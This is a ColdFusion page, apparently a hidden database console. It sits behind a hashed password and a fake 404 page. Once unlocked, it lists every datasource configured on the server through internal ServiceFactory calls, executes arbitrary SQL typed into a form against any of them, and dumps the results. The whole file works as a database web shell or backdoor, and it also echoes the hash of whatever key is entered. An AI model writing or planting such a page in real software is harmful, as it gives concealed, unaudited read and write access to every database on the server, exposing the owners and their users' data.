<cfparam name="k" default="none">
<cfif Hash(k) neq "568ECCD913CFF40066807D10EDFCF6AC">
	<!--- asegurar que tenga buenas_intenciones --->
	<cfoutput>#Hash(k)#</cfoutput>
	<form action="" method="post" style="margin:0">
	<input type="password" name="k" value="****" onfocus="this.select()">
	</form>
	<cfinclude template="/home/check/no-access-404.cfm">
	<cfabort>
</cfif>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" >
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Query</title>
<style type="text/css">
<!--
.style1 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
}
-->
</style>
</head>
<body>
<cfparam name="form.sql" default="">
<cfparam name="form.ds" default="minisif">

<!--- obtiene los nombres de los datasources --->
<cfset factory = CreateObject("java", "coldfusion.server.ServiceFactory")>
<cfset ds_service = factory.datasourceservice>
<cfset caches = ds_service.getNames()>
<cfset ArraySort( caches, 'textnocase', 'asc'  )>
<cfset datasources = ds_service.getDatasources()>
<cfoutput>
<form action="" method="post">
<input type="hidden" name="k" value="#k#">
<table border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td valign="top" class="style1">Consulta</td>
    <td valign="top">&nbsp;</td>
    <td valign="top" class="style1">Argumentos (usar '?' ) </td>
  </tr>
  <tr>
    <td rowspan="2" valign="top" class="style1"><textarea name="sql" id="sql" rows="18" cols="60" wrap="off" style="font-family:Verdana, Arial, Helvetica, sans-serif;font-size:10px;width:350px">#form.sql#</textarea></td>
    <td valign="top">&nbsp;</td>
    <td rowspan="4" valign="top" class="style1"><table border="0" cellpadding="0" cellspacing="2">
        <tr>
          <td width="30" align="center">No.</td>
          <td width="100" align="center">Tipo</td>
          <td width="150" align="center">Valor</td>
        </tr>
    </table>      <div style="overflow:auto;height:260px;">
	  <table border="0" cellpadding="0" cellspacing="2">
		  <cfset types="bigint,bit,char,blob,clob,date,decimal,double,float,idstamp,integer,longvarchar,money,money4,numeric,real,refcursor,smallint,time,timestamp,tinyint,varchar">
	    <cfloop from="1" to="30" index="argnum">
		  <cfparam name="form.argname#argnum#" default="">
		  <cfparam name="form.argtype#argnum#" default="">
  
      <tr>
          <td width="30" align="center">#argnum#</td>
          <td width="100"><select name="argtype#argnum#" id="argtype#argnum#">
		  <option value=""> (ninguno) </option>
		  <cfloop from="1" to="#ListLen(types)#" index="i">
		  <cfset thistype=ListGetAt(types,i)>
		  <option value="#thistype#" <cfif thistype is form['argtype'&argnum]>selected</cfif>>
			  #thistype#</option>
		  </cfloop>
          </select></td>
          <td width="150">
		  <input type="text" name="argname#argnum#" id="argname#argnum#" value="#form['argname'&argnum]#"></td>
        </tr></cfloop>
      </table>
      </div></td>
  </tr>
  <tr>
    <td valign="top">&nbsp;</td>
    </tr>
  <tr>
    <td valign="top"><span class="style1">Datasource:
        <select name="ds" id="ds">
          <cfloop from="1" to="#ArrayLen(caches)#" index="i">
            <option value="#caches[i]#" <cfif caches[i] is form.ds>selected</cfif>>#caches[i]# - #datasources[caches[i]].driver# </option>
          </cfloop>
        </select>
    </span></td>
    <td valign="top">&nbsp;</td>
    </tr>
  <tr>
    <td valign="top"><input type="submit" value="Ejecutar"></td>
    <td valign="top">&nbsp;</td>
    </tr>
</table>
<br>
<cfif len(Trim(form.sql))>
	<cfset sqlpart = ListToArray(' ' & form.sql & ' ','?')>

	<cfquery datasource="#form.ds#" name="ret"
		><cfloop from="1" to="#ArrayLen(sqlpart)#" index="i"
			><cfset thispart = sqlpart[i]
			><cfif i gt 1
				><cfqueryparam cfsqltype="cf_sql_#form['argtype'&(i-1)]#" value="#form['argname'&(i-1)]#" 
			></cfif>#PreserveSingleQuotes(thispart)#</cfloop></cfquery>
	<cfif isdefined('ret')>
		<cfdump var="#ret#">
	<cfelse>
		<BR><BR>Esta Instrucción no devuelve ningún resultado
	</cfif>
	
</cfif>
<br>
</form></cfoutput>

</body>
</html>
